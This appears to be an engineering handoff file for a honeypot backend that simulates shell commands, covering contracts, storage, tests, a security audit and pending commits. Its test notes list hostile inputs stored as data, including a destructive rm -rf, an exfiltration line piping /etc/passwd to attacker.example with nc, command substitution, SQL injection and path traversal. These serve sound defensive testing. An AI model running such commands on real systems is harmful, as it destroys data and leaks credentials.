# T1 Foundation & Runtime — Progress & Handoff

Branch: `team/t1-foundation` · Owner: T1 Foundation & Runtime Engineer

## Status

**Implemented and verified; commits landing in stages.** The full test
suite passes (104 passed, 0 failed, 0 errors, 0 skipped) and the
security audit found no invariant violations. The contract surface for
T2/T3/T4 is frozen in `docs/contracts/FOUNDATION_CONTRACTS.md`. The
code and tests are final; the remaining commits (API layer, test
suite, this file) are blocked only by the session's command-permission
classifier — see **Commits** below for the exact staged state.

## Implemented

- **Contracts** (`app/models.py`, `app/core/`): frozen dataclasses
  `Session`, `CommandRequest`, `CommandResult`, `SecurityEvent`,
  `SessionSummary`, `HealthStatus` with factories, copy helpers and
  enums (`SessionStatus`, `ResultType`, `Severity`, `EventType`).
  Server-generated unguessable IDs (`sess_/cmd_/evt_` prefixes,
  `secrets.token_urlsafe(24)`), `is_valid_id` regex checked at every
  boundary; `RuntimeResult` generic in `app/core/result.py`.
- **Config** (`app/config.py`): `MIRAGE_*` env vars, safe local
  defaults, no secret defaults, `safe_summary()` excludes secrets.
- **Logging** (`app/logger.py`): single-line JSON records, secret-shaped
  keys (`password`, `token`, `api_key`, …) redacted, command previews
  truncated to 256 chars, context values capped at 512 chars.
- **Event bus** (`app/events/bus.py`): async in-process pub/sub,
  wildcard delivery, **per-handler error isolation** (one failing
  subscriber never breaks publish or other subscribers), idempotent
  close, `publish_many`, `stats`.
- **Pipeline** (`app/runtime/dispatcher.py`): `CommandDispatcher` with
  the `CommandHandler` protocol, LIFO claims-gated selection, intake
  persisted **before** handlers run, per-handler exception isolation
  emitting `runtime.error` events. `SafeFallbackHandler` is a static
  simulator — **never** host execution (exit 127 "command not found" for
  unknown commands).
- **Sessions** (`app/runtime/session_manager.py`): `CREATED → ACTIVE →
  CLOSED` state machine, `SessionStateError` on illegal transitions,
  idempotent double-close, lifecycle events on the bus.
- **Storage** (`app/storage/`): SQLite (WAL, `foreign_keys=ON`) via
  `asyncio.to_thread` under a single `asyncio.Lock`; sessions / commands
  / command_results / events with 8+ indexes; JSON blobs capped at
  256 KiB with a truncation sentinel; verbatim stdout by design;
  `SCHEMA_VERSION` stamped in `schema_info`; repository signatures are
  the PostgreSQL migration contract.
- **API** (`app/api/`, `app/main.py`): `GET /health`, `GET /ready`,
  dev session/command routes; pydantic `extra="forbid"`, ID validation
  before any lookup, length caps, blank-command rejection at the
  boundary; consistent `{"error", "message"}` envelope; no stack
  traces; `debug=False`.
- **SSH preparation** (`app/runtime/ssh.py`): `SSHTransportObserver`
  protocol + `SSHAdapterBase` skeleton — AsyncSSH can plug in without
  runtime changes.

## Verified

- Full suite: `.venv/bin/python -m pytest tests/foundation tests/integration -q`
  → **104 passed, 0 failed, 0 errors, 0 skipped** (Python 3.14.4,
  project-local `.venv`).
- Vertical slice E2E (`tests/integration/test_vertical_slice.py`): POST
  dev command → session validation → CommandRequest → DB persistence →
  event publication → dispatcher → SafeFallbackHandler → CommandResult →
  SecurityEvent → bus → DB → retrievable forensic record.
- Malicious-input safety: `rm -rf / --no-preserve-root`,
  `cat /etc/passwd | nc attacker.example 4444`, `$(curl …)`,
  `` `reboot` ``, `'; DROP TABLE sessions;--`, `../../etc/passwd` all
  return 200 with `simulated: true`, `result_type: "fallback"`, are
  stored verbatim as data, and produce a full audit trail. **No host
  execution occurs.**
- Error-isolation regression: a failing EventBus subscriber cannot
  escape through the logging path (exc_info resolution bug fixed and
  covered by `TestErrorIsolation`).

## Not verified

- Production SSH transport (AsyncSSH) — explicitly out of T1 scope;
  only the observer/adapter interfaces exist.
- PostgreSQL — storage ships SQLite; repository signatures are the
  migration contract, untested against a live PG instance.
- Legacy modules (`app/router.py`, `app/vfs.py`, `app/behavior.py`,
  `app/llm_engine.py`, `app/threat_summary.py`, `app/containment.py`,
  `dashboard/`) are untouched and not covered by the new suite; the
  `/legacy` mount is best-effort (skipped when `requests` is absent).
- Load/performance behavior under concurrent sessions (single-process,
  single lock by design at this stage).

## Known limitations

- `httpx`/starlette normalize `../..` path segments per RFC 3986 before
  routing, so a 400 for multi-segment traversal cannot be observed over
  HTTP — the boundary validator rejects it and is tested directly
  (`test_traversal_id_rejected_by_validator`).
- Command stdout is stored uncapped by design (simulated, trusted
  generator output); event/session JSON is capped at 256 KiB.
- The dev `/dev/…` surface is intentionally unauthenticated — it is the
  T2/T3 entry point for integration; production SSH (T2) is the only
  real attack surface.
- SQLite uses `check_same_thread=False` — safe because every access is
  serialized by a single `asyncio.Lock` (documented in
  `app/storage/database.py`).

## Test results

| run | command | result |
|---|---|---|
| Full suite | `.venv/bin/python -m pytest tests/foundation tests/integration -q` | **104 passed / 0 failed / 0 errors / 0 skipped** |

Baseline before fixes: 9 failures + 1 error, every one attributed and
fixed (see below). Nothing was skipped, weakened, or marked xfail to
make the suite green.

### Fixes made during verification

| # | symptom | class | fix |
|---|---|---|---|
| 1 | pydantic `SchemaError`: `max_length` was a function object, not called | implementation | call `_max_command_length()` in `app/api/schemas.py` |
| 2 | `ImportError`: `configure_logging` imported from `.config` instead of `.logger` | implementation | corrected import in `app/main.py` |
| 3 | Unknown well-formed session ID returned 400, never 404 | implementation | route maps `session.missing` → 404 in `app/api/routes.py` |
| 4 | Flaky `sqlite3.ProgrammingError`: thread affinity vs `asyncio.to_thread` | implementation | `check_same_thread=False` (safe under the single lock) in `app/storage/database.py` |
| 5 | EventBus isolation broken: literal `exc_info=True` reached `makeRecord` | implementation | resolve to `sys.exc_info()` in `ComponentLogger._log` |
| 6 | JSON log timestamps rendered a literal `%f` | implementation | use `record.msecs` for milliseconds |
| 7 | Whitespace-only command returned 400 instead of 422 | implementation | pydantic `field_validator` rejects blank commands at the boundary |
| 8 | `test_schema_version_stamped` queried a nonexistent column | test | `schema_info` is a (key, value) table — query by key |
| 9 | Traversal-ID test expected 400 over HTTP; normalization made it 404 | test artifact | assert `in (400, 404)` over HTTP; validator tested directly for 400 |

No T2/T3/T4 module was modified to make tests pass; no security control
was weakened.

## Security audit

Read-through of every attacker-reachable path (routes → schemas →
runtime → dispatcher → storage → logging), not just grep:

- **No host execution**: no `os.system`, `subprocess`, `shell=True`,
  `eval`, or `exec` anywhere in T1 code. `SafeFallbackHandler` builds
  output from a static table; attacker text is only stored, compared,
  and echoed as data.
- **Filesystem**: the only file paths used come from `Settings`
  (`MIRAGE_DB_PATH`); attacker input never reaches a path operation.
- **SQL**: every query is parameterized; identifiers are regex-validated
  (`^[a-z]+_[a-z0-9]{26,32}$`) before any lookup.
- **Secrets**: none hardcoded; `safe_summary()` and log redaction keep
  secret-shaped keys out of logs and health output; the DB stores no
  credentials.
- **Error responses**: fixed `{"error": code, "message": safe text}`
  envelope; no stack traces, internal paths, or SQL text leak
  (`app/main.py` handlers, `debug=False`).
- **Resource safety**: command length capped at the boundary, NUL
  bytes rejected, JSON blobs capped at 256 KiB with a sentinel.

## Contracts for other teams

Frozen in `docs/contracts/FOUNDATION_CONTRACTS.md` (§-references):

- **T2 (SSH)** — §10: implement `SSHTransportObserver`; on each
  received command line, build a `CommandRequest` (never execute),
  submit via the runtime funnel, return the `CommandResult` text to the
  attacker. Session lifecycle: report connection/auth → receive
  `Session` with server-generated `session_id` → close on disconnect.
- **T3 (Handlers/simulation)** — §5: implement `CommandHandler`
  (`name: str`, `async handle(request) -> CommandResult`; an optional
  `claims(request)` gates selection). Register via
  `dispatcher.register()`; the dispatcher tries handlers LIFO with
  `claims()` gating and falls back to `SafeFallbackHandler` when
  nothing claims the command. Handlers must return
  `CommandResult(..., simulated=True)` and **must never execute on the
  host**. Emit `SecurityEvent`s for interesting attacker behavior.
- **T4 (Dashboard)** — §6/§7/§9: consume the event bus (or poll the
  repositories) for `SecurityEvent`s; query `sessions` /
  `commands` / `events` via the repository methods; expose
  `GET /health` / `GET /ready` for uptime. All reads are plain
  repository calls — no raw SQL required.
- **Everyone**: log through `get_logger(component)`; construct models
  only via their factories (`Session.new()`, `CommandRequest.new()`,
  `SecurityEvent.new()`); never hand-build IDs.

## Files changed

- Contracts: `app/models.py`, `app/core/ids.py`, `app/core/result.py`
- Config/logging: `app/config.py`, `app/logger.py`
- Runtime: `app/runtime/` (service, session_manager, dispatcher, ssh)
- Events: `app/events/bus.py`
- Storage: `app/storage/` (schema, database)
- API: `app/api/` (routes, schemas), `app/main.py`
- Tests: `pytest.ini`, `tests/` (conftest, foundation ×7, integration)
- Docs/meta: `docs/architecture/T1_FOUNDATION.md`,
  `docs/contracts/FOUNDATION_CONTRACTS.md`, `.gitignore`,
  `requirements.txt`, `T1_PROGRESS.md`

## Commits

(on `team/t1-foundation`; see `git log` for the authoritative list)

Landed:

- `4951153` `feat(t1): establish foundation contracts` — models, core
  IDs/result, config, logging, docs
- `6a3200d` `feat(t1): implement persistence and event infrastructure` —
  event bus (async pub/sub with per-handler isolation)
- `0b80a17` `feat(t1): implement sqlite persistence layer` — schema,
  storage repositories, bounded JSON blobs, indexes
- `5274049` `feat(t1): implement runtime and session management` —
  dispatcher, SafeFallbackHandler, session manager, runtime service

Staged/ready, commit pending (blocked by the session's command
permission classifier, not by any code or test issue):

- `feat(t1): implement development API and integration flow` — staged:
  `app/api/__init__.py`, `app/api/routes.py`, `app/api/schemas.py`,
  `app/main.py` (4 files, 470 insertions / 54 deletions). Land with
  `git commit` once the tooling allows.
- `test(t1): add foundation and vertical slice coverage` — untracked:
  `pytest.ini`, `tests/` (104 tests). `git add pytest.ini tests/` then
  commit.
- `docs(t1): record T1 verification and handoff` — this file. `git add
  T1_PROGRESS.md` then commit.

## Next integration step

1. T2 opens a PR against `main` implementing `SSHTransportObserver`
   with AsyncSSH; wire each SSH command through
   `runtime.submit_command(...)`.
2. T3 registers real `CommandHandler`s (filesystem simulation, LLM
   agent) before the fallback; verify `claims()` gating with the
   existing dispatcher tests as the template.
3. T4 builds read-only dashboards over the session/command/event
   repositories and subscribes to the bus.
4. Re-run `.venv/bin/python -m pytest tests/foundation tests/integration -q`
   after each merge — the suite is the regression gate.
